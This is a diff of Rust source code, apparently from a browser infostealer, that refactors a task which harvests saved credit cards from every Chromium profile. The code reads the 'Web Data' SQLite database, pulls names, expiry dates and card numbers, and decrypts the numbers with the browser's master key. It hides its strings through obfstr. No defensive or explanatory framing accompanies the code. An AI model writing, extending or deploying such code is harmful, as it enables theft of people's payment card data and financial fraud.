@@ -1,13 +1,12 @@
 use crate::alloc::borrow::ToOwned;
+use crate::chromium::{decrypt_data, BrowserData};
+use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, CreditCard};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
+use database::TableRecord;
+use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
 use utils::path::Path;
-use crate::chromium::BrowserData;
-use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, CreditCard};
-use obfstr::obfstr as s;
-use database::TableRecord;
-use utils::browsers::chromium::decrypt_data;
 
 const CREDIT_CARDS_NAME_ON_CARD: usize = 1;
 const CREDIT_CARDS_EXPIRATION_MONTH: usize = 2;
@@ -31,7 +30,7 @@ impl Task for CreditCardsTask {
     unsafe fn run(&self, parent: &Path) {
         let Some(mut credit_cards) = collect_from_all_profiles(
             &self.browser.profiles,
-            |profile| read_credit_cards(profile, &self.browser.master_key)
+            |profile| read_credit_cards(profile, &self.browser)
         ) else {
             return
         };
@@ -42,24 +41,24 @@ impl Task for CreditCardsTask {
     }
 }
 
-fn read_credit_cards(profile: &Path, master_key: &[u8]) -> Option<Vec<CreditCard>> {
+fn read_credit_cards(profile: &Path, browser_data: &BrowserData) -> Option<Vec<CreditCard>> {
     let web_data_path = profile / s!("Web Data");
     
     read_sqlite3_and_map_records(
         &web_data_path,
         s!("Credit_cards"),
-        |record| extract_card_from_record(record, master_key)
+        |record| extract_card_from_record(record, browser_data)
     )
 }
 
-fn extract_card_from_record(record: &dyn TableRecord, master_key: &[u8]) -> Option<CreditCard> {
+fn extract_card_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<CreditCard> {
     let name_on_card = record.get_value(CREDIT_CARDS_NAME_ON_CARD)?.as_string()?.to_owned();
     let expiration_month = record.get_value(CREDIT_CARDS_EXPIRATION_MONTH)?.as_integer()?;
     let expiration_year = record.get_value(CREDIT_CARDS_EXPIRATION_YEAR)?.as_integer()?;
     let use_count = record.get_value(CREDIT_CARDS_USE_COUNT)?.as_integer()?;
     
     let encrypted_card_number = record.get_value(CREDIT_CARDS_CARD_NUMBER)?.as_blob()?;
-    let card_number = unsafe { decrypt_data(encrypted_card_number, master_key) }?;
+    let card_number = unsafe { decrypt_data(encrypted_card_number, browser_data) }?;
     
     Some(CreditCard {
         name_on_card,
